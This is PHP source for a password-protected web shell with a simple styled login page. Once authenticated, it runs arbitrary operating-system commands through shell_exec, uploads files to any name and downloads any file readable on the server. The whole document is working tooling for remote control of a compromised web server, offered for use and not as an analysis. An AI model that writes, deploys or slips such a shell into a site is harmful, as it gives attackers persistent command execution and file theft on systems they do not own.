<?php

// PHP Web Shell

// Password protection
$password = 'password123'; // Change this to your desired password

// Authentication check
$authenticated = false;
$error = ''; // Error message variable
$cmd_output = ''; // Variable to hold command output
$download_error = ''; // Error variable for file download

if (isset($_POST['password'])) {
    if ($_POST['password'] === $password) {
        $authenticated = true;

        // Command execution feature
        if (isset($_POST['cmd'])) {
            $cmd_output = "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
        }

        // File upload feature
        if (isset($_FILES['file'])) {
            move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
            echo "File uploaded successfully!";
        }

        // File download feature
        if (isset($_POST['download'])) {
            $file = $_POST['download'];
            if (file_exists($file)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename='.basename($file));
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($file));
                flush();
                readfile($file);
                exit;
            } else {
                $download_error = "File not found!";
            }
        }
    } else {
        // If password is incorrect, set the error message
        $error = 'Invalid password! Please try again.';
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
        }
        .container {
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            width: 400px;
        }
        .error {
            color: red;
            margin-bottom: 20px;
            font-size: 18px;
        }
        .cmd-output {
            background-color: #f0f0f0;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
            text-align: left;
            font-family: monospace;
        }
        input[type="text"], input[type="password"], input[type="file"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            font-size: 18px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            padding: 10px 20px;
            font-size: 18px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <?php if (!$authenticated): ?>
            <!-- Display error if the password is incorrect -->
            <?php if ($error): ?>
                <div class="error"><?php echo $error; ?></div>
            <?php endif; ?>
            
            <!-- Login form -->
            <form method="POST" style="font-size: 20px;">
                <input type="password" name="password" placeholder="Password">
                <input type="submit" value="Login">
            </form>
        <?php endif; ?>

        <?php if ($authenticated): ?>
            <!-- Display the command output -->
            <div class="cmd-output">
                <?php echo $cmd_output ? $cmd_output : 'No command executed yet.'; ?>
            </div>

            <!-- Command execution form -->
            <form method="POST" style="font-size: 20px;">
                <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>">
                <input type="text" name="cmd" placeholder="Enter command">
                <input type="submit" value="Execute">
            </form>

            <!-- File upload form -->
            <form method="POST" enctype="multipart/form-data" style="font-size: 20px;">
                <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>">
                <input type="file" name="file">
                <input type="submit" value="Upload File">
            </form>

            <!-- Display the file download error if exists -->
            <div class="error">
                <?php echo $download_error ? $download_error : ''; ?>
            </div>

            <!-- File download form -->
            <form method="POST" style="font-size: 20px;">
                <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>">
                <input type="text" name="download" placeholder="File to download">
                <input type="submit" value="Download">
            </form>
        <?php endif; ?>
    </div>
</body>
</html>
